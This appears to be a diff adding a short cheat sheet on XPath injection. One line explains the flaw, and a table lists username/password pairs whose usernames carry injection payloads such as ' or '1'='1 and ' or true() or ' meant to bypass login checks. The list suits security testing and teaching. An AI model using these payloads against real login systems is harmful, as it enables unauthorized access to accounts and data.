@@ -1,0 +1,9 @@
+A vulnerability where attackers manipulate XPath queries to bypass login or access XML data.
+
+Username	Password
+' or '1'='1	anything
+" or "1"="1	anything
+admin' or '1'='1	anything
+' or true() or '	test
+' or 'a'='a	123
+' or 1=1 or '1'='   test
